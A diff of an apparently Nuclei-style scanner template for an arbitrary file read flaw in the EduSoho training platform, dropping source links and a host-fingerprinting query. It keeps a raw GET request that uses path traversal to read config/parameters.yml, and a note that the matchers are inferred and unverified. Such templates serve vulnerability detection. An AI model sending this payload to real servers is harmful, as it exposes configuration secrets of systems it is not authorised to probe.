@@ -3,14 +3,8 @@ info:
   name: EduSoho教培系统classropm-course-statistics存在任意文件读取漏洞
   author: hacktwo
   severity: high
-  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/0a72f07ee75dde95793a5e60e64c3c9d
-
-    [!] 推断说明: 状态码缺失, 推断为 200。原文响应特征为截图, 无法自动提取文本命中条件, 使用前请人工核验。'
+  description: '[!] 推断说明: 状态码缺失, 推断为 200。原文响应特征为截图, 无法自动提取文本命中条件, 使用前请人工核验。'
   tags: lfi,2025
-  metadata:
-    source: yuque-hacktwo-dtdx2v
-    doc-slug: 0a72f07ee75dde95793a5e60e64c3c9d
-    fofa: + fofa`body="Powered By EduSoho" || body="www.edusoho.com"`
 http:
 - raw:
   - 'GET /export/classroom-course-statistics?fileNames[]=../../../config/parameters.yml HTTP/1.1
